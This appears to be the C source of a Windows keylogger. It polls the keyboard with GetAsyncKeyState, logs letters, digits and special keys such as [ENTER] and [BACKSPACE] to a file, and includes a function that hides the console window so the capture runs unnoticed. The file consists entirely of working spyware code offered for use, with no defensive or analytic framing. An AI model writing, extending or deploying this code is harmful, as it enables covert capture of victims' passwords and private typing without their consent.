#include "keyLogger.h"

/* A collection of the supported characters other than letters or numbers */
key_t specialKeys[] = {
    VK_BACK, VK_TAB, VK_SHIFT, VK_MENU, VK_CAPITAL, VK_PAUSE, VK_SPACE, VK_CONTROL, VK_RETURN
};

/* The number of the supported characters other than letters or numbers */
size_t specialKeysSize = sizeof(specialKeys) / sizeof(key_t);

key_t getCurrentKey(void)
{
    key_t i;
    // Checks for the special keys
    for (i = 0; i < (short)specialKeysSize; ++i)
        if (GetAsyncKeyState(specialKeys[i])) return specialKeys[i];
    // Checks for numbers
    for (i = VK_0; i <= VK_9; ++i)
        if (GetAsyncKeyState(i)) return i;
    // Checks for letters
    for (i = VK_A; i <= VK_Z; ++i)
        if (GetAsyncKeyState(i)) return i;

    return 0;
}

void getKeyContext(const key_t key, char *context)
{
    const char *strContext = "ERROR";
    switch (key)
    {
    case 0:
        break;
    case VK_BACK:
        strContext = "[BACKSPACE]";
        break;
    case VK_TAB:
        strContext = "[TAB]";
        break;
    case VK_CONTROL:
        strContext = "[CTRL]";
        break;
    case VK_MENU:
        strContext = "[ALT]";
        break;
    case VK_RETURN:
        strContext = "[ENTER]";
        break;
    case VK_SHIFT:
        strContext = "[SHIFT]";
        break;
    case VK_CAPITAL:
        strContext = "[CAPS LOCK]";
        break;
    case VK_PAUSE:
        strContext = "[PAUSE]";
        break;
    case VK_SPACE:
        strContext = "[SPACE]";
        break;
    default:
        // for unsupported keys
        strContext = "[OTHER]";
    }
    strcpy_s(context, MAX_KEY_CONTEXT_LEN, strContext);
}

void writeKey(const key_t key, FILE *f)
{
    const BOOL isLetter = key <= VK_Z && key >= VK_A;
    const BOOL isNumber = key <= VK_9 && key >= VK_0;
    if (isLetter || isNumber)
        fprintf(f, "%c", (char)key);
    else
    {
        char *returnedStr = (char*)malloc(MAX_KEY_CONTEXT_LEN);
        getKeyContext(key, returnedStr);
        fprintf(f, "%s", returnedStr);
        free(returnedStr);
    }
}

errno_t logKeys(const char *outFileName, const size_t maximumKeys)
{
    FILE *outFile;
    const errno_t fileErr = fopen_s(&outFile, outFileName, "w");
    if (!fileErr)
    {
        size_t numOfKeys = 0;
        while (numOfKeys < maximumKeys)
        {
            Sleep(INTERVAL);
            const key_t currentKey = getCurrentKey();
            if (currentKey)
            {
                writeKey(currentKey, outFile);
                numOfKeys++;
            }
        }
        fclose(outFile);
    }
    return fileErr;
}

void hideConsoleWindow(void)
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
}
